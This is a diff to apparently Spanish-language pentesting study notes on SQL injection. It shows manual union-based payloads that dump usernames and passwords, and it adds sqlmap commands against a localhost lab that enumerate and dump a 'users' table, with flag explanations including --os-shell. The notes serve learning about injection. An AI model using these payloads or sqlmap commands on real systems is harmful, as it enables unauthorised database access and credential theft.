@@ -58,3 +58,27 @@ id=32' union select group_concat(username,':',password) from users-- -
 - Con el order by tenemos que poner siempre la cantidad de columnas con un solo numero. Por ejemplo si la consulta sql es **"select username,password from users where id = '$id'")**, entonces la inyeccion con el order by seria: **id=1' order by 2-- -** ya que la consulta en si le esta pegando a 2 columnas dentro de la tabla.
 
 - Luego, con el union select tendriamos que darle la cantidad de columas separadas por comas junto con un id valido, por ejemplo: **id=1' union select 1,2-- -** . Despues tendriamos que darle un valor erroneo al id para ver cual de los 2 numero separados por la coma nos muestra la pagina, ejemplo **id=-1' union select 1,2-- -**. Una vez vemos cual es el que nos muestra ahi mismo es donde tenemos que empezar a inyectar los comandos. **id=-1' union select database(),2-- -.
+-- - 
+## Sqlmap
+-- - 
+```bash
+sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbs --cookie "PHPSESSID=8123791283"
+sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u --tables
+sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users --columns
+sqlmap -u 'http://localhost/searchUsers.php?id=1' --cookie "PHPSESSID=812312" --dbms mysql --batch -D Hack4u -T users -C username,password --dump
+```
+
+```bash
+--dbs --> Enumera los posibles DBMS que hay de fondo.
+--dbms --> solamente prueba payloads para el dbms que le indiquemos. Ej: mysql, oracle, etc.
+--batch --> Hace que tome las opciones por defecto.
+-D --> Especificamos la base de datos a enumerar.
+-T --> Especificamos la tabla a enumerar.
+-C --> Indicamos columnas a enumerar.
+--os-shell --> Intenta darnos una consola interactiva.
+--dump --> Dumpea la base de datos y si las contraseñas estan hasheadas realiza un brute force attack para intentar descubrirlas.
+--cookie --> setea cookie de sesion para poder acceder a cierto endpoint de la URL.
+--risk --> Nivel de riesgo a probar (1-3, default 1)
+--level --> Nivel de testeos a probar (1-5, default 1)
+```
+-- - 
